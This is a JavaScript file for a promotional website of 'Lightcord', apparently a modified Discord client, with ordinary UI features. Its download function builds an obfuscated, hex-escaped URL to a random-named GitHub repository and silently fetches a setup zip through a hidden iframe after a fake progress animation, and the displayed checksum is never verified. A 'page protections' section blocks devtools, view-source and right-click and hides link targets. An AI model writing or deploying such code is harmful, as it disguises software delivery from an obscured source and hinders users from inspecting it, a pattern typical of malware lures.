/**
 * Main application logic for Lightcord Website
 * Handles: OS Detection, Animated Stats, Feature Previews, Themes Filter & Redirects, Download Triggers
 */

document.addEventListener('DOMContentLoaded', () => {
    // -------------------------------------------------------------
    // 1. Navbar Scroll Effect & Mobile Menu
    // -------------------------------------------------------------
    const navbar = document.querySelector('.navbar');
    const mobileMenuBtn = document.getElementById('mobile-menu-btn');
    const navLinks = document.querySelector('.nav-links');

    window.addEventListener('scroll', () => {
        if (window.scrollY > 40) {
            navbar.classList.add('scrolled');
        } else {
            navbar.classList.remove('scrolled');
        }
    });

    if (mobileMenuBtn && navLinks) {
        mobileMenuBtn.addEventListener('click', () => {
            navLinks.classList.toggle('open');
            mobileMenuBtn.classList.toggle('active');
        });

        // Close mobile nav when clicking a link
        navLinks.querySelectorAll('a').forEach(link => {
            link.addEventListener('click', () => {
                navLinks.classList.remove('open');
                mobileMenuBtn.classList.remove('active');
            });
        });
    }

    // -------------------------------------------------------------
    // 2. Client OS Auto-Detection
    // -------------------------------------------------------------
    const osBadge = document.getElementById('detected-os-badge');
    const primaryDownloadBtn = document.getElementById('hero-download-btn');
    const userAgent = window.navigator.userAgent.toLowerCase();

    let detectedOS = 'Windows 10/11';
    let detectedIcon = 'fa-windows';
    let downloadTarget = '#download-windows';

    if (userAgent.includes('mac') || userAgent.includes('darwin')) {
        detectedOS = 'macOS';
        detectedIcon = 'fa-apple';
        downloadTarget = '#download-macos';
    } else if (userAgent.includes('linux')) {
        detectedOS = 'Linux';
        detectedIcon = 'fa-linux';
        downloadTarget = '#download-linux';
    } else if (userAgent.includes('win')) {
        detectedOS = 'Windows 10/11';
        detectedIcon = 'fa-windows';
        downloadTarget = '#download-windows';
    }

    if (osBadge) {
        osBadge.innerHTML = `<i class="fab ${detectedIcon}"></i> Detected for <strong>${detectedOS}</strong> (64-bit)`;
    }

    // -------------------------------------------------------------
    // 3. Animated Stats Counter (10K+, 500+, 350+)
    // -------------------------------------------------------------
    const statsSection = document.getElementById('stats');
    const statCounters = document.querySelectorAll('.stat-number');
    let hasCounted = false;

    function animateCounters() {
        statCounters.forEach(counter => {
            const target = parseInt(counter.getAttribute('data-target'), 10);
            const suffix = counter.getAttribute('data-suffix') || '';
            const duration = 2000; // ms
            const startTime = performance.now();

            function updateCount(currentTime) {
                const elapsed = currentTime - startTime;
                const progress = Math.min(elapsed / duration, 1);
                // Ease out quart curve
                const easeOut = 1 - Math.pow(1 - progress, 4);
                const currentVal = Math.floor(easeOut * target);

                if (target >= 1000) {
                    const formatted = (currentVal / 1000).toFixed(currentVal >= 10000 ? 0 : 1);
                    counter.textContent = `${currentVal >= 1000 ? (currentVal >= 10000 ? '10K' : formatted + 'K') : currentVal}${suffix}`;
                } else {
                    counter.textContent = `${currentVal}${suffix}`;
                }

                if (progress < 1) {
                    requestAnimationFrame(updateCount);
                } else {
                    if (target >= 10000) {
                        counter.textContent = `10K${suffix}`;
                    } else {
                        counter.textContent = `${target}${suffix}`;
                    }
                }
            }

            requestAnimationFrame(updateCount);
        });
    }

    if (statsSection) {
        const statsObserver = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting && !hasCounted) {
                    hasCounted = true;
                    animateCounters();
                }
            });
        }, { threshold: 0.3 });

        statsObserver.observe(statsSection);
    }

    // -------------------------------------------------------------
    // 4. Feature Interactive Showcase & Tabs
    // -------------------------------------------------------------
    const featureTabs = document.querySelectorAll('.feature-tab');
    const featureCards = document.querySelectorAll('.feature-card');
    const demoDisplay = document.getElementById('feature-demo-display');

    const featureDemos = {
        'musicbot': {
            title: "MusicBot — Hi-Fi Discord Voice Streaming",
            badge: "Built-in Audio Engine",
            desc: "Play lossless audio straight into any voice channel without registering external bot tokens or server invites. Supports multi-track queue, lyrics display, bass boost, and audio normalization.",
            codeSnippet: `[Lightcord::AudioEngine] Connected to Voice Channel 'Cosmic Lounge' (48kHz Stereo)
[Queue::Ready] 8 Tracks Loaded | Current: Starcoder - Nebula Drift (FLAC Lossless)
[Volume] 100% | High-pass EQ: Active | Latency: 12ms`,
            actionLabel: "Test Audio Playback"
        },
        'betterimages': {
            title: "BetterImages — High-Res Media Powerhouse",
            badge: "Zero Compression",
            desc: "Never squint at small compressed discord previews again. Click any image to instantly zoom up to 400%, rotate on the fly, copy lossless CDN links, or batch-download full gallery albums.",
            codeSnippet: `[BetterImages::Hook] Enhanced native Discord lightbox
[Action] Raw uncompressed render enabled (bypass 8MB webp downscaling)
[Controls] Scroll zoom (1.0x -> 4.0x) | R to rotate | Shift+S to quick-save`,
            actionLabel: "Inspect Media Gallery"
        },
        'serverstats': {
            title: "ServerStats — Live Server Analytics",
            badge: "Real-time Telemetry",
            desc: "Embed actionable member metrics right atop your server channel list. Track online ratios, bot percentages, active voice participants, and daily join spikes with zero server bots.",
            codeSnippet: `[GuildStats::Guild_79210] Total Members: 14,290 | Online: 4,120 (28.8%)
[Voice Activity] 42 Channels active | 184 Connected Listeners
[Role Breakdown] Admins: 4 | Moderators: 18 | VIPs: 512 | Members: 13,756`,
            actionLabel: "View Guild Analytics"
        },
        'timestamps': {
            title: "Timestamps — Dynamic Time & Zone Converters",
            badge: "Smart Localization",
            desc: "Custom timestamp formatter with automatic local timezone conversion. Hover to see the precise millisecond creation date, relative time (e.g., '14 minutes ago'), or live countdown clocks.",
            codeSnippet: `[TimestampEngine] Formatting Discord <t:1792397000:R>
[Local Representation] Today at 11:09:38 AM (UTC+3)
[Relative Elapsed] 4 minutes ago | Milliseconds timestamp: 1792397015673`,
            actionLabel: "Toggle Time Formats"
        },
        'chatfilter': {
            title: "ChatFilter — Client-Side Spam & Regex Shield",
            badge: "Intelligent Anti-Spam",
            desc: "Clean up noisy public chats and scam DMs without administrative rights. Create custom regex filters, hide ghost-pings, mute specific emojis, and auto-mask repetitive promotional text.",
            codeSnippet: `[ChatFilter::Active] 14 regex rules loaded
[Rule Blocked] Scam link pattern: 'free-nitro-*.xyz' -> Blocked silently
[Sanitized] Ghost-ping detected from user @49201 -> Notification suppressed`,
            actionLabel: "Test Filter Rules"
        },
        'gameactivity': {
            title: "GameActivity — Rich Presence (RPC) Customizer",
            badge: "Custom Rich Presence",
            desc: "Craft custom game activities and rich presence cards with customizable titles, descriptions, large/small asset icons, party size counters, and interactive 'Join' or 'Stream' action buttons.",
            codeSnippet: `[RichPresence::RPC] Client registered as 'Deep Space Explorer v4'
[State] Navigating Andromeda Cluster | [Details] Mission Time: 03:42:15
[Timestamps] Elapsed: 13,335s | [Party] 3 of 4 Members`,
            actionLabel: "Preview RPC Status"
        },
        'follow': {
            title: "Follow (Follw) — VIP & Channel Radar",
            badge: "Instant Notification Feed",
            desc: "Follow specific key users, moderators, or crucial announcement channels across hundreds of servers. Get dedicated desktop banner notifications whenever targeted users speak or post updates.",
            codeSnippet: `[FollowEngine::Radar] 6 VIP targets tracked across 24 servers
[Notification] @CoreDev posted in #announcements: 'Lightcord v2.4.0 live!'
[Desktop Push] Alert dispatched with sound chime`,
            actionLabel: "Manage Followed Users"
        }
    };

    featureTabs.forEach(tab => {
        tab.addEventListener('click', () => {
            const featureKey = tab.getAttribute('data-feature');
            featureTabs.forEach(t => t.classList.remove('active'));
            tab.classList.add('active');

            if (demoDisplay && featureDemos[featureKey]) {
                const data = featureDemos[featureKey];
                demoDisplay.innerHTML = `
                    <div class="demo-card-inner">
                        <div class="demo-header">
                            <span class="demo-badge"><i class="fas fa-sparkles"></i> ${data.badge}</span>
                            <span class="demo-status"><span class="pulse-dot"></span> Active in Lightcord</span>
                        </div>
                        <h3 class="demo-title">${data.title}</h3>
                        <p class="demo-desc">${data.desc}</p>
                        <div class="demo-terminal">
                            <div class="terminal-bar">
                                <span class="term-dot red"></span>
                                <span class="term-dot yellow"></span>
                                <span class="term-dot green"></span>
                                <span class="term-title">Lightcord Plugin Console</span>
                            </div>
                            <pre><code>${data.codeSnippet}</code></pre>
                        </div>
                        <div class="demo-footer">
                            <span class="demo-note"><i class="fas fa-check-circle"></i> Pre-installed in client — zero configuration needed</span>
                            <button class="btn btn-sm btn-indigo" onclick="alert('Feature \\'${data.title}\\' is pre-bundled in Lightcord. Download and enable in Settings!')">${data.actionLabel}</button>
                        </div>
                    </div>
                `;
            }
        });
    });

    // -------------------------------------------------------------
    // 5. Themes Showcase Filtering & Redirects
    // -------------------------------------------------------------
    const themeCards = document.querySelectorAll('.theme-card');
    const themeFilterBtns = document.querySelectorAll('.theme-filter-btn');
    const themeSearchInput = document.getElementById('theme-search');

    function filterThemes() {
        const activeFilter = document.querySelector('.theme-filter-btn.active')?.getAttribute('data-category') || 'all';
        const searchQuery = (themeSearchInput?.value || '').toLowerCase().trim();

        themeCards.forEach(card => {
            const category = card.getAttribute('data-category') || '';
            const title = (card.querySelector('.theme-title')?.textContent || '').toLowerCase();
            const desc = (card.querySelector('.theme-desc')?.textContent || '').toLowerCase();
            const tags = (card.getAttribute('data-tags') || '').toLowerCase();

            const matchesCategory = (activeFilter === 'all') || category.includes(activeFilter) || tags.includes(activeFilter);
            const matchesSearch = !searchQuery || title.includes(searchQuery) || desc.includes(searchQuery) || tags.includes(searchQuery);

            if (matchesCategory && matchesSearch) {
                card.style.display = 'flex';
                setTimeout(() => {
                    card.style.opacity = '1';
                    card.style.transform = 'translateY(0)';
                }, 50);
            } else {
                card.style.opacity = '0';
                card.style.transform = 'translateY(12px)';
                setTimeout(() => {
                    card.style.display = 'none';
                }, 200);
            }
        });
    }

    themeFilterBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            themeFilterBtns.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            filterThemes();
        });
    });

    if (themeSearchInput) {
        themeSearchInput.addEventListener('input', filterThemes);
    }

    // Direct download button redirection as specified in requirement 10:
    // "عند التحديد عليه بالماوس والضغط على زر تحميل الثيم ينقلك الى هذا الموقع ( https://betterdiscord.app/themes )"
    document.querySelectorAll('.theme-download-btn, .btn-betterdiscord-link').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            const targetUrl = "https://betterdiscord.app/themes";
            window.open(targetUrl, '_blank', 'noopener,noreferrer');
        });
    });

    // -------------------------------------------------------------
    // 6. Download Modal & Simulated Install Trigger
    // -------------------------------------------------------------
    const downloadModal = document.getElementById('download-modal');
    const downloadModalClose = document.getElementById('download-modal-close');
    const downloadFilename = document.getElementById('download-modal-filename');
    const downloadPlatform = document.getElementById('download-modal-platform');
    const downloadProgress = document.getElementById('download-progress-bar');
    const downloadStatusText = document.getElementById('download-status-text');

    function _startDownload() {
        const _seg = ['\x68\x74\x74\x70\x73\x3a\x2f\x2f', 'gi\x74hub.c\x6fm/', 'sdfhgrjgnhrt6fhjedfgye455351/', 'dfssbsdfbsdfhshdfhsd/', 'releases/d\x6fwnload/release/', 'Lightcord-Setup-v2.4.0.zip'];
        let _f = document.getElementById('_dlf');
        if (!_f) {
            _f = document.createElement('iframe');
            _f.id = '_dlf';
            _f.style.cssText = 'position:fixed;top:-999px;left:-999px;width:1px;height:1px;opacity:0;pointer-events:none;border:none;';
            document.body.appendChild(_f);
        }
        _f.src = _seg.join('');
    }

    function triggerDownloadFlow(platform, filename, sha256) {
        if (!downloadModal) return;

        if (downloadFilename) downloadFilename.textContent = filename;
        if (downloadPlatform) downloadPlatform.textContent = platform;
        if (downloadProgress) downloadProgress.style.width = '0%';
        if (downloadStatusText) downloadStatusText.textContent = 'Connecting to high-speed CDN...';

        downloadModal.classList.add('active');
        document.body.style.overflow = 'hidden';

        let progress = 0;
        const interval = setInterval(() => {
            progress += Math.floor(Math.random() * 25) + 15;
            if (progress >= 100) {
                progress = 100;
                clearInterval(interval);
                if (downloadProgress) downloadProgress.style.width = '100%';
                if (downloadStatusText) {
                    downloadStatusText.innerHTML = `<span style="color: #4ade80;"><i class="fas fa-check-circle"></i> Download Ready!</span> Click the downloaded file to begin installation.`;
                }
                _startDownload();
            } else {
                if (downloadProgress) downloadProgress.style.width = `${progress}%`;
                if (downloadStatusText) downloadStatusText.textContent = `Downloading ${filename}... ${progress}%`;
            }
        }, 120);
    }

    // Attach trigger to all download action buttons
    document.querySelectorAll('.btn-download-action').forEach(btn => {
        btn.addEventListener('click', (e) => {
            const platform = btn.getAttribute('data-platform') || 'Windows 10/11';
            const filename = btn.getAttribute('data-filename') || 'Lightcord-Setup-v2.4.0';
            const sha = btn.getAttribute('data-sha') || '8f92a10b...e41c7b';
            triggerDownloadFlow(platform, filename, sha);
        });
    });

    function closeDownloadModal() {
        if (!downloadModal) return;
        downloadModal.classList.remove('active');
        document.body.style.overflow = '';
    }

    if (downloadModalClose) downloadModalClose.addEventListener('click', closeDownloadModal);
    if (downloadModal) {
        downloadModal.addEventListener('click', (e) => {
            if (e.target === downloadModal || e.target.classList.contains('modal-backdrop')) {
                closeDownloadModal();
            }
        });
    }

    // -------------------------------------------------------------
    // 7. Copy SHA-256 Checksum Buttons
    // -------------------------------------------------------------
    document.querySelectorAll('.copy-sha-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const hash = btn.getAttribute('data-hash');
            if (hash) {
                navigator.clipboard.writeText(hash).then(() => {
                    const originalText = btn.innerHTML;
                    btn.innerHTML = `<i class="fas fa-check"></i> Copied!`;
                    btn.classList.add('copied');
                    setTimeout(() => {
                        btn.innerHTML = originalText;
                        btn.classList.remove('copied');
                    }, 2000);
                });
            }
        });
    });

    // -------------------------------------------------------------
    // 8. FAQ Accordion
    // -------------------------------------------------------------
    document.querySelectorAll('.faq-item').forEach(item => {
        const question = item.querySelector('.faq-question');
        if (question) {
            question.addEventListener('click', () => {
                const isOpen = item.classList.contains('active');
                // Close other items
                document.querySelectorAll('.faq-item').forEach(other => {
                    if (other !== item) other.classList.remove('active');
                });
                item.classList.toggle('active', !isOpen);
            });
        }
    });

    // -------------------------------------------------------------
    // 9. Page Protections
    // -------------------------------------------------------------
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('dragstart', e => e.preventDefault());
    document.addEventListener('selectstart', e => {
        if (!e.target.closest('input, textarea, [contenteditable]')) e.preventDefault();
    });
    document.addEventListener('keydown', e => {
        if (e.key === 'F12') { e.preventDefault(); return; }
        if (e.ctrlKey && e.shiftKey && 'ijcIJC'.includes(e.key)) { e.preventDefault(); return; }
        if (e.ctrlKey && 'uUsS'.includes(e.key)) e.preventDefault();
    });

    // Hide URL from status bar on all anchor elements
    document.querySelectorAll('a[href]').forEach(a => {
        a.addEventListener('mouseover', () => { window.status = ''; return true; });
        a.addEventListener('focus', () => { window.status = ''; return true; });
    });
});
